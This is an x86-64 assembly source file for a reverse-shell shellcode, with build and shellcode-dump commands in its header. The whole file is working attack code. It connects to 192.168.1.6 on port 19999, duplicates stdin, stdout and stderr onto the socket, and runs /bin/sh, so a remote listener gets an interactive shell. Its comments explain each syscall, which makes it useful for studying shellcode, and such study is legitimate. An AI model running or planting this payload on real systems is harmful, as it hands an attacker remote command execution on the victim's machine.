/*

Author: Abhinav Thakur
File:   reverse_shell.s
Compile:        $ gcc -Wl,-N -nostdlib -static reverse_shell.s -o ./reverse_shell.elf
Dump shellcode :$ objcopy --dump-section .text=reverse_shell.raw ./reverse_shell.elf
Run            :$ ./reverse_shell.elf

Connects back to machine @
IP  : 1192.168.1.6 (0xc0.0xa8.0x01.0x06)  
port: 19999 (0x4e1f)

*/

.global _start
_start:
.intel_syntax noprefix

	/* sockfd = socket (2, 1, 0)  */
	push 41
	pop rax			/* syscall number for SYS_socket */
	push 2		
	pop rdi			/* domain = AF_INET = 2 */
	push 1
	pop rsi			/* type = SOCK_STREAM = 1 */
	cdq				/* sign extend eax->edx:eax */
	syscall

	/*
		Creating struct sockaddr_in evilAddr;
		struct sockaddr {
               sa_family_t sa_family;
               char        sa_data[14];
           }
		struct sockaddr_in {
    		short            sin_family;   // AF_INET
    		unsigned short   sin_port;     // htons(19999)
    		struct in_addr   sin_addr;     // struct in_addr
    		char             sin_zero[8];  // clear this out 
		};

		connect (sockfd,
				{sa_family=AF_INET, sin_port=0x1f4e, sin_addr=0x0601a8c0},
				0x10); 
	*/
	mov edi, eax		/* edi = sockfd (eax) */
	cdq
		push rdx		/* rsp -> 0x0000000000000000 */
		push rdx		/* push another QWORD */
		mov word ptr [rsp], 2
		mov word ptr [rsp+2], 0x1f4e		/* 0x4e1f (19999) */ 
		mov dword ptr [rsp+4], 0x0601a8c0	/* 192.168.1.6 (0xc0.0xa8.0x01.0x06) */ 
		push rsp
		pop rsi			/* rsi -> [rsp]: 0x0601a8c01f4e0002  NULL_QWORD) */
	mov dl, 0x10		/* rdx = 0x10 (rdx is xor'd above) */
	push 42
	pop rax				/* rax = 42 (connect syscall number) */
	syscall

	/* if connect_ret_status < 0: exit */
	cmp al, 0
	jl tata
	
	/* 
		edi = sockfd
		for (ecx = 0; ecx < 3; ++ecx)
			dup2 (edi, ecx);
	*/
	xor ebx, ebx		/* ebx = counter */
again:
	xor esi, esi
	mov sil, bl			/* rsi = ebx ([0,1,2], i.e. newfd) */
	push 33
	pop rax				/* rax = 33 (syscall number for dup2) */
	syscall
	inc bl 				/* ++ebx */
	cmp bl, 3			/* if (ebx < 3) */
	jl again

    /* execve("//bin/sh", NULL, NULL) */
    xor esi, esi       					/* argv = NULL */
    push rsi
    mov rdi, 0x68732f6e69622f2f         /* "hs/nib//" */
    push rdi                            /* rsp -> "//bin/sh" */
    push rsp
    pop rdi                             /* rdi -> "//bin/sh" */
    push 59                             /* syscall number for execve = 59 */
    pop rax
    cdq                                 /* sign-extend EAX -> EDX:EAX */
    syscall	

tata:
	/* exit (7) */
	push 7			/* exit status = 7 */
	pop rdi
	push 60			/* rax = 60 (syscall number for exit) */
	pop rax	
	syscall
